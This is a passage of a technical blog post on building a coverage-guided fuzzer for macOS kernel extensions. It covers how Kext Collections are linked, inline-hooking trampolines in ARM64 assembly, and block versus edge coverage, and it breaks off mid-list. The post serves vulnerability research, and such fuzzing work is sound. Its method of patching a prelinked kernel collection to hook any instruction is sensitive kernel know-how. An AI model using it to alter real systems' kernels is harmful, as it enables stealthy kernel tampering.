<p>If we replace <code class="language-plaintext highlighter-rouge">xpacd</code>, subsequently we can’t just use call-clobbered registers later in <code class="language-plaintext highlighter-rouge">ldar	x9, [x16]</code>. using this regsiter after <code class="language-plaintext highlighter-rouge">xpacd</code> is a common pattern. we need to preserve these registers before calling into the exported function. Compilers know about function calls, and they emit proper assembly with respect to callee-saved and caller-saved registers. But why is KextFuzz’s instrumentation working? Keep on reading we will answer it.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">autda</span>	<span class="nv">x16</span><span class="p">,</span> <span class="nv">x17</span>
<span class="nf">mov</span>	<span class="nv">x17</span><span class="p">,</span> <span class="nv">x16</span>
<span class="nf">xpacd</span>	<span class="nv">x17</span>      <span class="c1">; &lt;&lt;&lt;&lt;----- instrumented and replaced by a call</span>
<span class="nf">cmp</span>	<span class="nv">x16</span><span class="p">,</span> <span class="nv">x17</span>
<span class="nf">b.eq</span>	<span class="mh">0x9720</span>
<span class="nf">brk</span>	<span class="err">#</span><span class="mh">0xc472</span>
<span class="nf">ldar</span>	<span class="nv">x9</span><span class="p">,</span> <span class="p">[</span><span class="nv">x16</span><span class="p">]</span> <span class="c1">;&lt;&lt;&lt;&lt;----- dereferencing x16.</span></code></pre></figure>

<p>Instrumenting any instruction needs at least to patch 5 instructions to store and restore what is going to be modified by <code class="language-plaintext highlighter-rouge">__auth_stubs</code>. we also need to put the original patched instructions somewhere. 
the instrumented instructions should be replaced by:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">stp</span> <span class="nv">x16</span><span class="p">,</span> <span class="nv">x17</span><span class="p">,</span> <span class="p">[</span><span class="nb">sp</span><span class="p">,</span> <span class="o">-</span><span class="mi">16</span><span class="p">]</span><span class="err">!</span> <span class="err">#</span> <span class="nv">Push</span> <span class="nv">x16</span> <span class="nv">and</span> <span class="nv">x17</span> <span class="nv">onto</span> <span class="nv">the</span> <span class="nv">stack</span>
<span class="nf">stp</span> <span class="nv">lr</span><span class="p">,</span> <span class="nv">lr</span><span class="p">,</span> <span class="p">[</span><span class="nb">sp</span><span class="p">,</span> <span class="o">-</span><span class="mi">16</span><span class="p">]</span><span class="err">!</span> <span class="err">#</span> <span class="nv">Push</span> <span class="nv">the</span> <span class="nv">Link</span> <span class="nv">Register</span> <span class="p">(</span><span class="nv">LR</span><span class="p">)</span> <span class="nv">onto</span> <span class="nv">the</span> <span class="nv">stack</span>
<span class="nf">bl</span> <span class="nv">COV_</span> <span class="err">#</span> <span class="nv">Call</span> <span class="nv">the</span> <span class="nv">COV_</span> <span class="nv">function</span>
<span class="nf">ldp</span> <span class="nv">lr</span><span class="p">,</span> <span class="nv">lr</span><span class="p">,</span> <span class="p">[</span><span class="nb">sp</span><span class="p">],</span> <span class="mi">16</span> <span class="err">#</span> <span class="nv">Pop</span> <span class="nv">the</span> <span class="nv">Link</span> <span class="nv">Register</span> <span class="p">(</span><span class="nv">LR</span><span class="p">)</span> <span class="nv">from</span> <span class="nv">the</span> <span class="nv">stack</span>
<span class="nf">ldp</span> <span class="nv">x16</span><span class="p">,</span> <span class="nv">x17</span><span class="p">,</span> <span class="p">[</span><span class="nb">sp</span><span class="p">],</span> <span class="mi">16</span> <span class="err">#</span> <span class="nv">Pop</span> <span class="nv">x16</span> <span class="nv">and</span> <span class="nv">x17</span> <span class="nv">from</span> <span class="nv">the</span> <span class="nv">stack</span></code></pre></figure>

<p>COV_ will collect coverage, execute the original instruction and return</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">COV_:</span> 
  <span class="nf">nop</span> <span class="err">#</span> <span class="nv">executing</span> <span class="nv">original</span> <span class="nv">instructions</span> <span class="nv">in</span> <span class="nv">here</span>
  <span class="nf">ret</span></code></pre></figure>

<p>I thought the main obstacles in here is that I don’t where my KEXT will be loaded later at runtime, therefore I can’t just replace an instruction inside random BB with a jump/call to my coverage function. I can just call into an exported function. 
I was thinking about modifying target KEXT by injecting some trampoline inside it then from there I could save and restore CPU context and call into my exported function.
for example modifying <code class="language-plaintext highlighter-rouge">__auth_stubs</code> or adding a new section (e.g., __TEXT) to Mach-O file of the KEXT. so again every BB would jump into the injected trampoline and this trampoline would save and restore needed registers, then call into a function that collects coverages. with this way I just needed to patch one instruction in each BB.
but after playing with Mach-O file of a KEXT, it turn out kmutil is very restrict about format of Mach-O,
and it just ignored my new section and didn’t allow patching other places.</p>

<p><a href="https://github.com/apple-oss-distributions/kext_tools">kmutil</a> is open source and it heavily uses dyld and IOKitUser.
<img src="/assets/pishi/13.png" width="500" style="display: block; margin: 0 auto" /></p>

<p>I will explain what is kmutil in the next section.</p>

<h4 id="birth-of-pishi">Birth of Pishi</h4>

<p>I have to provide an overview of loading steps of kernel modules on MacBooks.<br />
In macOS 11 or later Apple <a href="https://eclecticlight.co/2022/04/14/the-kernel-and-extensions-2-secure-boot/">has changed</a> its previous scheme of prelinked kernelcaches and <a href="https://apple.fandom.com/wiki/Kernel_extension">Loadable kernel module</a> or KEXTs, to three prelinked kernel collection blobs:</p>

<ul>
  <li>The ‍<code class="language-plaintext highlighter-rouge">Boot Kext Collection</code> (BKC), contains the kernel itself, and all the major system kernel extensions required for a Mac to function.</li>
  <li>The <code class="language-plaintext highlighter-rouge">System Kext Collection</code> (SKC), This contains all the other system kernel extensions, which are loaded after booting with the BKC.</li>
  <li>The <code class="language-plaintext highlighter-rouge">Auxiliary Kext Collection</code> (AKC), is built and managed by the service kernelmanagerd. This contains all installed third-party kernel extensions, and is loaded after the other two collection.</li>
</ul>

<p>kmutil is a tool that can <a href="https://developer.apple.com/documentation/Apple-Silicon/installing-a-custom-kernel-extension?changes=__3____7_7_1&amp;language=objc">creates</a> different types of <code class="language-plaintext highlighter-rouge">Kext Collection</code>.</p>

<p>The documented method for loading third-party KEXTs involves rebuilding the auxiliary KEXT collection with an additional KEXT. and the systme will load it in the next reboot.</p>

<p>But it’s also possible to embed any extra KEXT into <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code> as KextFuzz was doing it.
the KextFuzz fuzzer relies on the ability to inject additional KEXTs into the boot collection.
They embed an instrumented KEXT along with an additional KEXT which contains the hooked function.
<img src="/assets/pishi/6.png" width="600" style="display: block; margin: 0 auto" /></p>

<p>As I explain latter, there is a important difference between these two <code class="language-plaintext highlighter-rouge">Kext Collection</code>.<br />
Let’s see how imported functions work in a <code class="language-plaintext highlighter-rouge">Kext Collection</code> and why I was getting errors when I was modifying  <code class="language-plaintext highlighter-rouge">__auth_stubs</code> or adding sections and how KextFuzz instrumentation is working( do you remember this stub clobbers <code class="language-plaintext highlighter-rouge">X16</code> and <code class="language-plaintext highlighter-rouge">x17</code> without saving/restoring them?).<br />
disassemblers showe that calling into an exported function in <code class="language-plaintext highlighter-rouge">Kext Collection</code> blob is just <code class="language-plaintext highlighter-rouge">BL</code> instruction to a relative address, instead of using <code class="language-plaintext highlighter-rouge">__auth_stubs</code> as a proxy.</p>

<p>A call into a exported function through <code class="language-plaintext highlighter-rouge">__auth_stubs</code> in KEXT.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">bl</span> <span class="nv">to_a_stub_address</span></code></pre></figure>

<p>Is replaced with a call into function directly in <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code>.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">bl</span> <span class="nv">relative_address_of_function.</span></code></pre></figure>

<p>kmutil has removed mach-o <code class="language-plaintext highlighter-rouge">__auth_stubs</code>.</p>

<p><img src="/assets/pishi/15.png" width="600" style="display: block; margin: 0 auto" /></p>

<p>To load a <a href="https://developer.apple.com/support/kernel-extensions/">depreciate</a> on-demand loadable KEXT, kernel had to bind and <a href="https://github.com/qyang-nj/llios/blob/main/dynamic_linking/chained_fixups.md">fix any relative address</a> at runtime.
but for prelinked blobs, To accelerate the boot process, these steps are executed at link time when <a href="https://github.com/apple-oss-distributions/dyld/blob/65bbeed63cec73f313b1d636e63f243964725a9d/cache-builder/AppCacheBuilder.cpp#L5707">creating</a> a <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code>.
Two comments inside <a href="https://github.com/apple-oss-distributions/dyld/blob/65bbeed63cec73f313b1d636e63f243964725a9d/cache-builder/AppCacheBuilder.cpp#L5707">AppCacheBuilder</a> of dyld confirms our findings.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="n">AppCacheBuilder</span><span class="o">::</span><span class="n">buildAppCache</span><span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="n">InputDylib</span><span class="o">&gt;&amp;</span> <span class="n">dylibs</span><span class="p">)</span>
  <span class="p">{</span> <span class="p">....</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">removeStubs</span><span class="p">()</span> <span class="p">)</span> <span class="p">{</span>
          <span class="c1">// Stubs were removed, but we need to rewrite calls which would have gone through those stubs</span>
          <span class="n">rewriteRemovedStubs</span><span class="p">();</span>
      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="p">...</span>
      <span class="p">}</span>
      <span class="p">...</span>
  <span class="p">}</span>
    
<span class="kt">void</span> <span class="n">AppCacheBuilder</span><span class="o">::</span><span class="n">rewriteRemovedStubs</span><span class="p">()</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="c1">// We need to find what the auth stubs pointed to, then rewrite all</span>
  <span class="c1">// users of the auth stubs to jump to those locations inst</span>
  <span class="p">...</span>
<span class="p">}</span></code></pre></figure>

<p>But this is not the case for <code class="language-plaintext highlighter-rouge">Auxiliary Kext Collection</code>, kmutil doesn’t remove <code class="language-plaintext highlighter-rouge">_auth_stubs</code>.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">bool</span> <span class="n">AppCacheBuilder</span><span class="o">::</span><span class="n">removeStubs</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// Only eliminate stubs in the base kernel collection.  We could eliminate stubs</span>
    <span class="c1">// in the auxKC too, for those calls resolved within the auxKC, but its not worth it right now</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">appCacheOptions</span><span class="p">.</span><span class="n">cacheKind</span> <span class="o">!=</span> <span class="n">Options</span><span class="o">::</span><span class="n">AppCacheKind</span><span class="o">::</span><span class="n">kernel</span> <span class="p">)</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">_options</span><span class="p">.</span><span class="n">archs</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">dyld3</span><span class="o">::</span><span class="n">GradedArchs</span><span class="o">::</span><span class="n">arm64e</span> <span class="p">)</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">hasSancovGateSection</span><span class="p">()</span> <span class="p">)</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Latter at runtime XNU will load <code class="language-plaintext highlighter-rouge">Auxiliary Kext Collection</code> and <a href="https://github.com/apple-oss-distributions/xnu/blob/8d741a5de7ff4191bf97d57b9f54c2f6d4a15585/osfmk/mach/dyld_kernel_fixups.h#L211">fix the relative addresses</a>.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="n">arm_init</span> <span class="o">-&gt;</span>  <span class="n">arm_vm_init</span> <span class="o">-&gt;</span>
  <span class="n">arm_vm_auxkc_init</span> <span class="o">-&gt;</span> <span class="n">arm_auxkc_init</span> <span class="o">-&gt;</span> 
      <span class="n">kernel_collection_slide</span><span class="p">()</span> 
        <span class="p">{</span>
          <span class="cm">/*
          * Now we have the chained fixups, walk it to apply all the rebases 
          */</span>
        <span class="p">}</span></code></pre></figure>

<p>If the load address of KEXTs within <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code> are relatives to each other, we can replace any instruction with a jump to somewhere else inside our KEXT without worrying about <code class="language-plaintext highlighter-rouge">__auth_stubs</code>.</p>

<p>This is a huge primitive we can hook into any addrress we like.<br />
<strong>consequently</strong> unlink KextFuzz, instead of instrumenting a KEXT’s Mach-O file, we instrument them later inside <code class="language-plaintext highlighter-rouge">Boot Kext Collection</code> blob.</p>

<h4 id="instrumentation">Instrumentation.</h4>
<p>At this point I know how to hook into any instruction and jump to any address inside my KEXT.
but how to do this instrumentation reliably without corrupting current context( CPU registers, stacks,…)?
as I told before we can’t just jump into another place, we have to make sure CPU and memory state are same before and after our call.</p>

<p>This is <a href="https://www.microsoft.com/en-us/research/project/detours/">classic</a> <a href="https://www.amazon.de/-/en/Rootkits-Subverting-Windows-Kernel/dp/0321294319">and well documented</a> <a href="https://www.malwaretech.com/2015/01/inline-hooking-for-programmers-part-1.html">inline</a> <a href="https://en.wikipedia.org/wiki/Hooking">hooking</a>.<br />
We need to have a <a href="https://kylehalladay.com/blog/2020/11/13/Hooking-By-Example.html">trampoline</a> to preserve and restore CPU registers.
and it should be compliant with <a href="https://developer.apple.com/documentation/xcode/writing-arm64-code-for-apple-platforms">Apple silicon</a>’s <a href="https://en.wikipedia.org/wiki/Application_binary_interface">ABI</a>.<br />
a <code class="language-plaintext highlighter-rouge">trampoline</code> is a technique used to redirect the execution flow of a function or method to a different piece of code.</p>

<p><img src="/assets/pishi/35.png" width="300" style="display: block; margin: 0 auto" /></p>

<p>I manged to come up with the following one.<br />
each instrumented instruction needs to jump to an instance of following trampoline to be able to work without any problems.<br />
Placeholder for the original instruction will be replaced by the original instruction during instrumentation.<br />
Another key point is that <a href="https://developer.arm.com/documentation/dui0041/c/ARM-Procedure-Call-Standard/Function-entry-examples/Definitions">leaf functions</a> do not save the <a href="https://eklitzke.org/link-registers">LR on the stack</a> so we need to save and restore it in our trampoline.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">instrument_trampolines</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">asm</span> <span class="k">volatile</span> <span class="p">(</span>
                  <span class="s">".rept "</span> <span class="n">xstr</span><span class="p">(</span><span class="n">REPEAT_COUNT_THUNK</span><span class="p">)</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>  <span class="c1">// Repeat the following block many times</span>
                  <span class="s">"    STR x30, [sp, #-16]!</span><span class="se">\n</span><span class="s">"</span>            <span class="c1">// save LR. we can't restore it in pop_regs. as we have jumped here.</span>
                  <span class="s">"    bl _push_regs</span><span class="se">\n</span><span class="s">"</span>
                  <span class="s">"    mov x0, #0x0000</span><span class="se">\n</span><span class="s">"</span>                 <span class="c1">// placeholder targeted_kext flag.</span>
                  <span class="s">"    mov x1, #0x4141</span><span class="se">\n</span><span class="s">"</span>                 <span class="c1">// fix the correct numner when instrumenting as arg0.</span>
                  <span class="s">"    mov x1, #0x4141</span><span class="se">\n</span><span class="s">"</span>                 <span class="c1">// placeholder for BB address</span>
                  <span class="s">"    mov x1, #0x4141</span><span class="se">\n</span><span class="s">"</span>
                  <span class="s">"    mov x1, #0x4141</span><span class="se">\n</span><span class="s">"</span>
                  <span class="s">"    bl _sanitizer_cov_trace_pc</span><span class="se">\n</span><span class="s">"</span>
                  <span class="s">"    bl _pop_regs</span><span class="se">\n</span><span class="s">"</span>
                  <span class="s">"    LDR x30, [sp], #16</span><span class="se">\n</span><span class="s">"</span>              <span class="c1">// restore LR</span>
                  <span class="s">"    nop</span><span class="se">\n</span><span class="s">"</span>                             <span class="c1">// placeholder for original inst.</span>
                  <span class="s">"    nop</span><span class="se">\n</span><span class="s">"</span>                             <span class="c1">// placeholder for jump back</span>
                  <span class="s">".endr</span><span class="se">\n</span><span class="s">"</span>                               <span class="c1">// End of repetition</span>
                  <span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>this instructions will do:</p>
<ol>
  <li>Save the Link Register (LR). because we have to call a function to save the current context/registers. This call will clobber the <code class="language-plaintext highlighter-rouge">LR</code>, and <code class="language-plaintext highlighter-rouge">_push_regs</code> is too large to be as part of this trampoline.</li>
  <li>Save context/registers via <code class="language-plaintext highlighter-rouge">_push_regs</code>.</li>
  <li>Move BB’s ID( the address of the instrumented instruction) and KEXT’s ID number as arguments of <code class="language-plaintext highlighter-rouge">_sanitizer_cov_trace_pc</code>. we will write correct number in these placeholders in instrumentation time.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">_sanitizer_cov_trace_pc</code> to collect the coverage.</li>
  <li>Restore the registers with <code class="language-plaintext highlighter-rouge">_pop_regs</code>.</li>
  <li>Restore the Link Register (LR).</li>
  <li>Execute original instruction. this step is the reason that each instrumentation point needs its own trampoline.</li>
  <li>Jump back to next instruction of the patched adddress.</li>
</ol>

<p>As shown in the following image, our <code class="language-plaintext highlighter-rouge">extra KEXT</code> will include all the necessary functions, such as <code class="language-plaintext highlighter-rouge">_sanitizer_cov_trace_pc</code>, along with a large amount of trampolines.<br />
We can use directives <code class="language-plaintext highlighter-rouge">.rept .endr</code> to spray memory(not for <a href="https://en.wikipedia.org/wiki/Heap_spraying">exploitation</a> this time) with plenty of trampolines.
<a href="https://developer.arm.com/documentation/100068/0608/migrating-from-armasm-to-the-armclang-integrated-assembler/migration-of-armasm-macros-to-integrated-assembler-macros#:~:text=enclosed%20between%20a%20.-,rept%20and%20.,be%20used%20within%20a%20macro.">These directives</a> allow a sequence of instructions to be assembled repeatedly.</p>

<p><img src="/assets/pishi/18.png" width="600" style="display: block; margin: 0 auto" /></p>

<h4 id="what-exactly-should-be-instrumented">What exactly should be instrumented?</h4>

<p>Let’s repeat again that we want to have Coverage-guided fuzzing,
Coverage-guided fuzzing is a type of feedback-aware fuzzing that employs code coverage as a metric to direct the fuzzer. It leverages this information to make informed decisions about which inputs to mutate, aiming to maximize code coverage.</p>

<p>Fuzzer-centric <a href="https://en.wikipedia.org/wiki/Code_coverage">code coverage</a> metrics can be categorized into <code class="language-plaintext highlighter-rouge">Control flow</code> and <code class="language-plaintext highlighter-rouge">Data flow</code> coverages:</p>
<ol>
  <li>Control flow coverage:
    <ul>
      <li>Basic blocks coverage</li>
      <li>Edge coverage</li>
      <li>Paths coverage</li>
      <li><a href="https://googleprojectzero.blogspot.com/2021/12/this-shouldnt-have-happened.html">Stack Coverage!</a></li>
    </ul>
  </li>
  <li><a href="https://clang.llvm.org/docs/SanitizerCoverage.html#tracing-data-flow">Data flow coverage</a></li>
</ol>

<p>First we need to define Control Flow Graph (CFG).<br />
<code class="language-plaintext highlighter-rouge">control-flow graph (CFG) is a representation, using graph notation, of all paths that might be traversed through a program during its execution.</code> (Wikipedia)<br />
Basic blocks form the vertices or nodes in a <code class="language-plaintext highlighter-rouge">CFG</code>, while jumps instructions represent the Edges, accordingly, a <a href="https://en.wikipedia.org/wiki/Path_(graph_theory)">Path</a> is defined to the specific route taken through the graph.<br />
Wikipedia definition of BB is,
<code class="language-plaintext highlighter-rouge">In compiler construction, a basic block is a straight-line code sequence with no branches in except to the entry and no branches out except at the exit.</code>
<img src="/assets/pishi/19.png" width="200" style="display: block; margin: 0 auto" /></p>
<blockquote>

</blockquote>

<p>To identify interesting inputs, a fuzzer can analyze how many basic blocks are reached by the input. This is one of the simplest yet most effective ways to guide the fuzzer.
but edge coverage gives much better insight into how the program runs than just block coverage.<br />
I can not explain the importance of the edge coverage better than the <a href="https://lcamtuf.coredump.cx/afl/technical_details.txt">AFL technical paper</a>.</p>

<figure class="highlight"><pre><code class="language-asm" data-lang="asm">[edge] coverage provides considerably more insight into the execution
path of the program than simple block coverage. In particular, it trivially
distinguishes between the following execution traces:

  A -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE)
  A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE)

This aids the discovery of subtle fault conditions in the underlying code,
because security vulnerabilities are more often associated with unexpected
or incorrect state transitions than with merely reaching a new basic block.</code></pre></figure>

<p>Let me provide a visual example. if the execution flows from BB1 to BB2 and then to BB3, all basic blocks are covered(no vulnerability with 100% coverage). However, a use after free vulnerability happens if execution takes another path, from BB1 directly to BB3 and then to BB2.</p>

<p><img src="/assets/pishi/36.png" width="200" style="display: block; margin: 0 auto" /></p>

<p>While I knew how AFL and Jackalope has implemented edge coverage, I wanted to gain a deeper understanding of libFuzzer’s coverages collection.
libFuzzer uses LLVM’s built-in coverage instrumentation (SanitizerCoverage). and among other metrics, it also claims supporting edge coverage, after spending some time in libfuzzer’s source code, I revisited SanitizerCoverage’s webpage and saw how they are trying to do it:<br />
<code class="language-plaintext highlighter-rouge">If blocks A, B, and C are all covered we know for certain that the edges A=&gt;B and B=&gt;C were executed, but we still don’t know if the edge A=&gt;C was executed. Such edges of control flow graph are called critical. The edge-level coverage simply splits all critical edges by introducing new dummy blocks and then instruments those blocks:</code></p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="kt">void</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// dummy block;</span>
  <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>The definition of <code class="language-plaintext highlighter-rouge">critical edge</code> on Wikipedia is:<br />
<code class="language-plaintext highlighter-rouge">A critical edge is an edge which is neither the only edge leaving its source block, nor the only edge entering its destination block.</code><br />
but this is not a edge coverage.</p>

<p>furthermore it’s discussed in <a href="https://wcventure.github.io/FuzzingPaper/Paper/SP18_ColLAFL.pdf">ColLAFL</a>:</p>

<div style="display: flex; align-items: center;">
    <img src="/assets/pishi/22.png" alt="Description of image" style="width: 300px; height: auto; margin-right: 10px;" />
    <p>SanitizerCoverage further removes critical edges to secure the latter inference, and claim to support edge coverage.
    But it is just an enhanced version of block coverage. Block coverage provides fewer information than edge coverage.
    Critical edge is just one factor that hinders  inferring edge coverage from block coverage. As shown in Figure 2, 
    there are no critical edges in function foo. Two paths P1 and P2 share most of their edges except that they take
    different sub-paths in function foo. So the block coverages of P1 and P2 are exactly the same, but their edge coverages 
    are different. For example, the edge B1-&gt;C1 only exists in path P1.
</p>
</div>
<p>before we continue I have to say that what is happening under the hood for libFuzzer is way more complicated than this
you can read about it on <a href="https://cyruscyliu.github.io/posts/2021-11-02-libFuzzer-cov-control/#details-beneath-fsanitizefuzzer">details beneath fsanitizefuzzer</a> blog post.</p>

<p>I’d like to briefly discuss <a href="https://github.com/googleprojectzero/CompareCoverage">compare shattering</a>(comparison unrolling) or sub-instruction profiling, which is associated with <code class="language-plaintext highlighter-rouge">Data flow coverage</code>.
Compare coverage is a method for simplifying complex comparisons in code into easier, one-byte versions that a fuzzer can easily guess.<br />
Imagine trying to guess a password. If each attempt results an access denied, it would take a long time to crack it. However, if you receive feedback for each character you guess, you can significantly speed up the process of finding the correct password.</p>

<p>Compare coverage will change this comparison to the next <a href="https://andreafioraldi.github.io/articles/2019/07/20/aflpp-qemu-compcov.html">nested if statements</a>.
guessing one out of 0xffffffff possible numbers, narrowed down to 256 possible answers each time.</p>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">if</span> <span class="p">(</span><span class="n">input</span> <span class="o">==</span> <span class="mh">0xabad1dea</span><span class="p">)</span> <span class="p">{</span>
  <span class="cm">/* terribly buggy code */</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="cm">/* secure code */</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="k">if</span> <span class="p">(</span><span class="n">input</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="o">==</span> <span class="mh">0xab</span><span class="p">){</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">input</span> <span class="o">&amp;</span> <span class="mh">0xff0000</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span> <span class="o">==</span> <span class="mh">0xad</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">input</span> <span class="o">&amp;</span> <span class="mh">0xff00</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="o">==</span> <span class="mh">0x1d</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((</span><span class="n">input</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xea</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* terrible code */</span>
        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>SanitizerCoverage already handles these situations with <code class="language-plaintext highlighter-rouge">__sanitizer_cov_trace_cmpX</code> and <code class="language-plaintext highlighter-rouge">__sanitizer_cov_trace_const_cmpX</code> as part of its <code class="language-plaintext highlighter-rouge">Data flow coverage</code>.</p>

<p>Choosing between BB, Edge, or Path coverage involves a trade-off among performance, storage, and simplicity. Path coverage gives more insight into how a program runs, but it also makes implementation and analysis more complex with its own problems e.g. <a href="https://en.wikipedia.org/wiki/Path_explosion">Path explosion</a>.</p>

<p>I’ve decided to focus on instrumenting basic blocks for now.</p>
<h4 id="aarch64-time">AArch64 time.</h4>

<p>Now we have to answer some more question:</p>
<ul>
  <li>How to assemble/disassemble?</li>
  <li>how to find basic blocks?</li>
  <li>How to fix the relative instruction?</li>
</ul>

<p>After experimenting with Keystone and reviewing TinyInst to understand how to locate basic blocks (BBs),
I’ve decided to use Ghidra scripts. Ghidra supports macOS Boot Kext Collection and can enumerate basic blocks, as well as assemble and disassemble instructions. this is all we wanted.</p>

<p>Binary rewriting is difficult. especially in the kernel, where every mistake could trigger a kernel panic. I wanted to make instrumentation as simple as possible while ensuring that it’s efficient, reliable, and acceptable.
to make instrumentation super easy and reliable I based my approach on the facts that:</p>
<ol>
  <li>All ARM64 Instructions are 32 bits long, otherwise, it would be really difficult to patch small-sized instructions, with a big size jump. it was a real issue in <a href="https://www.ragestorm.net/blogs/?p=17">x86-64</a>.</li>
  <li>BBs are Disjoint sets of addresses( I explain this later).</li>
  <li>Almost all ARM64 instructions are non-relative.</li>
</ol>

<p>The A64 instruction set also has support for position-independent:</p>
<ul>
  <li>PC-relative literal loads. e.g <code class="language-plaintext highlighter-rouge">LDR</code> instruction with label.</li>
  <li>Process state flag and compare based conditional branches.</li>
  <li>Unconditional branches, including branch and link, have a range of ± 128MB.</li>
</ul>

<p>Beside above instructions we also have some other relative instructions:</p>
<ul>
  <li>ADR: PC-relative address.</li>
  <li>ADRP: PC-relative address to 4KB page. ( but it definitely has one “add” after it.)</li>
  <li>LDRSW (literal): Load Register Signed Word (literal).</li>
  <li>PRFM (literal): Prefetch Memory (literal).</li>
  <li>PAC: when Binding Pointers to Addresses. Using the address of the pointer(PC or SP) as a Context/modifier.</li>
</ul>

<p>AArch64 mnemonics can have 3 types of operands. <code class="language-plaintext highlighter-rouge">Immediate</code>, <code class="language-plaintext highlighter-rouge">Register</code>, <code class="language-plaintext highlighter-rouge">Memory</code>.<br />
and as I told above the only PC relative operand is label and it’s only used in LDR instructions.
<img src="/assets/pishi/27.png" style="display: block; margin: 0 auto" /></p>

<p>Branches are the edges of the CFG, so they are not part of BBs.</p>

<p>With respect to above points with a high probability we can find at least one non PC-relative <a href="https://developer.arm.com/documentation/ddi0602/2024-09/Base-Instructions">instruction</a> in every basic block (BB).</p>

<p>Some non-relative instructions:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python">    <span class="n">instruction</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">'and'</span><span class="p">,</span>  <span class="s">'ldadd'</span><span class="p">,</span>   <span class="s">'stur'</span><span class="p">,</span>  <span class="s">'mov'</span><span class="p">,</span>
    <span class="s">'add'</span><span class="p">,</span>   <span class="s">'str'</span><span class="p">,</span>    <span class="s">'ldp'</span><span class="p">,</span>   <span class="s">'bfxil'</span>
    <span class="s">'stp'</span><span class="p">,</span>   <span class="s">'mul'</span><span class="p">,</span>    <span class="s">'lsl'</span><span class="p">,</span>   <span class="s">'sub'</span><span class="p">,</span>
    <span class="s">'lsr'</span><span class="p">,</span>   <span class="s">'cmp'</span><span class="p">,</span>    <span class="s">'tst'</span><span class="p">,</span>   <span class="s">'ldur'</span><span class="p">,</span> 
    <span class="s">'orn'</span><span class="p">,</span>   <span class="s">'bic'</span><span class="p">,</span>    <span class="s">'cmn'</span><span class="p">,</span>   <span class="s">'eon'</span><span class="p">,</span>
    <span class="s">'neg'</span><span class="p">,</span>   <span class="s">'adc'</span><span class="p">,</span>    <span class="s">'mvn'</span><span class="p">,</span>   <span class="s">'ana'</span><span class="p">,</span> 
    <span class="s">'eor'</span><span class="p">,</span>   <span class="s">'sbc'</span><span class="p">,</span>    <span class="s">'orr'</span><span class="p">,</span>   <span class="s">'ldset'</span><span class="p">,</span>
    <span class="s">'ubfx'</span><span class="p">,</span>  <span class="s">'msub'</span><span class="p">,</span>   <span class="s">'udiv'</span><span class="p">,</span>  <span class="s">'cmhs'</span><span class="p">,</span>
    <span class="s">'xtn'</span><span class="p">,</span>   <span class="s">'fmov'</span><span class="p">,</span>   <span class="s">'sxtw'</span><span class="p">,</span>  <span class="s">'ccmp'</span><span class="p">,</span>
